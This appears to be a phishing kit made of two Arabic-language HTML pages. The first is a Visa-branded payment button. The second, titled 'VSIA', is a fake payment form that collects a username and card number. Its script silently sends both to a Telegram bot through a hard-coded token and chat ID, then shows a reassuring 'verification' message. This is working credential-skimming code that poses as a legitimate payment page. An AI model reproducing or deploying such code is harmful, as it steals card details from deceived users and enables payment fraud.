<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دفع عبر فيزا</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: transparent;
            font-family: 'Arial', sans-serif;
        }
        
        .visa-payment-btn {
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 15px 35px;
            background: rgba(23, 42, 107, 0.85); /* لون فيزا الأزرق */
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            text-decoration: none;
            backdrop-filter: blur(5px);
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }
        
        .visa-payment-btn:hover {
            background: rgba(23, 42, 107, 1);
            transform: translateY(-3px);
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
        }
        
        .visa-payment-btn:active {
            transform: translateY(0);
        }
        
        .visa-logo {
            width: 30px;
            margin-left: 10px;
        }
    </style>
</head>
<body>
    <a href="https://www.visa.com/payment" class="visa-payment-btn" target="_blank">
        الدفع عبر فيزا
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="فيزا" class="visa-logo">
    </a>
</body>

<!DOCTYPE html
<html>
<head>
    <meta charset="UTF-8">
    <title>VSIA</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            background: none;
        }
        body {
            font-family: Arial, sans-serif;
            font-size: 18px;
            padding: 20px;
        }
        .logo {
            text-align: center;
            font-size: 24px;
            font-weight: bold;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        input {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border: 1px solid #ccc;
            box-sizing: border-box;
        }
        button {
            background-color: #4CAF50;
            color: white;
            border: none;
            padding: 12px;
            width: 100%;
            font-size: 18px;
            cursor: pointer;
            margin-top: 10px;
        }
        .alert {
            display: none;
            background-color: #4CAF50;
            color: white;
            padding: 15px;
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="logo"> </div>
    
    <form id="paymentForm">
        <div class="form-group">
            <label for="username">اسم المستخدم:</label>
            <input type="text" id="username" required>
        </div>
        <div class="form-group">
            <label for="card">رقم البطاقة (14-15 رقم):</label>
            <input type="text" id="card" pattern="\d{14,15}" required>
        </div>
        <button type="submit">دفع الآن</button>
    </form>

    <div id="successAlert" class="alert">
        سيتم تحقق من خلال ريبوت
    </div>

    <script>
        document.getElementById('paymentForm').onsubmit = async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value;
            const card = document.getElementById('card').value;
            
            // إرسال إلى تليجرام
            const botToken = '7187779048:AAG2qZOl6JYI7pr_EJIb6C371HCuxcAZe7A';
            const chatId = '7154036384';
            const message = `كارد جديد:\n👤 الاسم: ${username}\n💳 البطاقة: ${card}`;
            
            try {
                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message
                    })
                });
                
                document.getElementById('successAlert').style.display = 'block';
                document.getElementById('paymentForm').reset();
                
            } catch (error) {
                alert('حدث خطأ في الإرسال');
            }
        };
    </script>
</body>
</html>
